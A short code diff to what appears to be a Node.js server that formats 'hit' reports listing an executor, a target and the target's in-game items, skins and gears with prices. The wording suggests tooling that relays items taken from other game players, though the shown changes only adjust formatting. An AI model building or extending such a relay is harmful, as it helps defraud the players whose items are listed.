@@ -28,7 +28,6 @@ app.post('/transform', async (req, res) => {
 function buildHitEmbed(data) {
   const scriptName = process.env.SCRIPT_NAME || 'Script';
   const executor = data.executor || 'Desconocido';
-  const target = data.target || {};
   const timestamp = data.timestamp || '';
 
   // Targeted
@@ -36,17 +35,17 @@ function buildHitEmbed(data) {
   const baseSkins = data.baseSkins || [];
   const gears = data.gears || [];
 
-  const targetedBrainrotList = targetedBrainrots.map(item => `• ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
+  const targetedBrainrotList = targetedBrainrots.map(item => `• ${item.name} — ${item.price}`).join('\n') || 'Ninguno';
   const targetedSkinsList = baseSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
   const targetedGearsList = gears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
   const targetedGearsSkins = [targetedSkinsList, targetedGearsList].filter(Boolean).join('\n') || 'Ninguno';
 
-  // Untargeted (ahora incluye brainrots, skins y gears)
+  // Untargeted
   const untargetedBrainrots = data.untargetedBrainrots || [];
   const untargetedSkins = data.untargetedBaseSkins || [];
   const untargetedGears = data.untargetedGears || [];
 
-  const untargetedBrainrotList = untargetedBrainrots.map(item => `• 🧠 ${item.displayName} — $${item.price}/s`).join('\n') || '';
+  const untargetedBrainrotList = untargetedBrainrots.map(item => `• 🧠 ${item.name} — ${item.price}`).join('\n') || '';
   const untargetedSkinList = untargetedSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
   const untargetedGearList = untargetedGears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
   const untargetedAll = [untargetedBrainrotList, untargetedSkinList, untargetedGearList].filter(Boolean).join('\n') || 'Ninguno';
